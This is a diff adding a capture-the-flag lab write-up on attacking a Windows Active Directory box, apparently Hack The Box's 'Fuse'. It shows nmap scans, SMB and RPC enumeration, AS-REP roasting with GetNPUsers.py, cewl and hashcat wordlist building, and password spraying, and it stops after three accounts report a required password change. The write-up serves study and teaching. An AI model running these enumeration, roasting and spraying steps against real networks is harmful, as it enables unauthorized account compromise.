@@ -1,0 +1,108 @@
+I start off with an nmap scan:
+└─# nmap -sC -sV -A 10.10.10.193
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-06-12 01:47:36Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+
+Host script results:
+|_clock-skew: mean: 2h34m49s, deviation: 4h02m30s, median: 14m48s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE\x00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System time: 2021-06-11T18:47:58-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-06-12T01:48:00
+|_  start_date: 2021-06-12T01:46:17
+
+Running rppclient I get access denied since I do not have a password. Maybe to retry this if I get a password.
+└─# rpcclient 10.10.10.193 -U%
+rpcclient $> enumdomusers 
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> enumdomgroups
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> enumjobs
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+rpcclient $> enumprinters
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+Also might come in handy later, a full port scan:
+└─# nmap -p- --min-rate 10000 10.10.10.193
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49675/tcp open  unknown
+49679/tcp open  unknown
+49753/tcp open  unknown
+
+Now on to smb enumeration:
+└─# smbmap -H 10.10.10.193
+[!] Authentication error on 10.10.10.193
+└─# smbclient -L 10.10.10.193
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+Try to enumerate shares:
+The guest account is disabled:
+└─# smbclient -I 10.10.10.193 -L FUSE -U 'guest%'
+session setup failed: NT_STATUS_ACCOUNT_DISABLED
+
+Onwards to something else, I want to test if there is an account with kerberoas pre-authentication not set:
+for user in $(cat users.txt); do python GetNPUsers.py -format john -no-pass "fabricorp/$user" -dc-ip 10.10.10.193; echo; done
+It returns the below for all users:
+[*] Cannot authenticate administrator, getting its TGT
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+Another option to get passwords using cewl:
+cewl -w passfile.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
+
+Now onwards to getting the password through password spraying:
+And before then, I need to generate a better password list => 
+└─# hashcat --force cewlpass.txt -r /usr/share/hashcat/rules/best64.rule --stdout > passwords.txt
+└─# python3 rpcSpray.py -U users.txt -p Fabricorp01 -t 10.10.10.193
+Running
+Spraying using Fabricorp01
+Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE using the password Fabricorp01 and the account bnielson
+Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE using the password Fabricorp01 and the account tlavel
+Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE using the password Fabricorp01 and the account bhult
+Complete
+
